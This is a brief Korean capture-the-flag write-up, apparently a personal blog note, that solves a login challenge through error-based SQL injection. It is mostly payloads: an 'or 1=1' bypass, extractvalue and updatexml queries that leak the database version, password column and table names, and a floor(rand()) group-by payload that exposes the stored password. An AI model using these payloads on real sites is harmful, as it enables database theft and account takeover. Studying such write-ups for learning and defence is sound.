id=221.146.10.167&pw=pw&type=1 or 1=1

id=221.146.10.167&pw=pw&type=1 and extractvalue(0xa,concat(0xa, @@version))

id=221.146.10.167&pw=pw&type=1 and extractvalue(0xa,concat(0xa, (select ps from t_user)))

id=221.146.10.167&pw=pw&type=1 and extractvalue(0xa,concat(0xa, (select ps from all_user_accounts)))

select id from user where id=1 and updatexml(null,concat(0x3a,(우리가 실행할 쿼리),null);
이러한 쿼리를 사용한다면 우리는 에러를 사용하여 현재 데이터베이스 이름을 알 수 있을 것입니다.
(Select database()는 우리에게 현재 데이터베이스를 리턴해 줍니다.)

id=221.146.10.167&pw=pw&type=1 and updatexml(null,concat(0x3a,(select table_name from information_schema.tables),null)

만약에 정확한 테이블명을 안다면?? 그래서 from 뒤에 붙일 수 있다면 어쩌면 바로 flag를 얻을수 있을지도 모른다
왜냐하면 
일단 내가 아는 건 type이 약하기 때문에 원하는 값을 붙일 수 있다는 것이고 
위에 나오는 구문을 활용했을 때 select ps ~하고 sql구문을 집어 넣을 수 있다는 것이다 
따라서 어떻게 보면 관건은 from 뒤에 어떤 테이블 명이 들어올 것이냐 인지도 모른다 
->라고 생각했지만 실제 payload는 그보다는 훨씬 복잡했다 
아래를 보면 group by를 응용하고 있다는 것을 알 수 있다 

id=221.146.10.167&pw=pw&type=1 and extractvalue(0xa,concat(0xa, (elect table_name from information_schema.tables))

id=221.146.10.167&pw[]=pw&type=1 or row(1,1)=(select count(*),concat(ps,0x3a,floor(rand()*2)) x from (select 1 union select 2 union select 3)a group by x limit 1)

1=1 and row(1,1)>(select count(*),concat(version(),floor(rand(0)*2)) x from (select 1 union select 2 union select 3)a group by x limit 1);

id=221.146.10.167&pw=pw&type=2 or row(1,1)=(select count(*),concat(ps,0x3a,floor(rand()*2)) x from (select 1 union select 2 union select 3)a group by x limit 1)

정말 내 취향은 아닌 문제이지만 
어쨋든 이 문제는 꼭 admin이 아닌 user로도 로그인해도 풀리는 간단한 문제였다 
위에 나온 것처럼 payload를 구성하면 group key 값이 뜨는데 
그것이 pw이므로 user로 입력해주면 원하는 flag를 얻을 수 있다 
풀고 나서 궁금한 거긴 한데 
이 문제는 admin으로는 로그인 하는 게 불가능한 문제인 걸까?? 
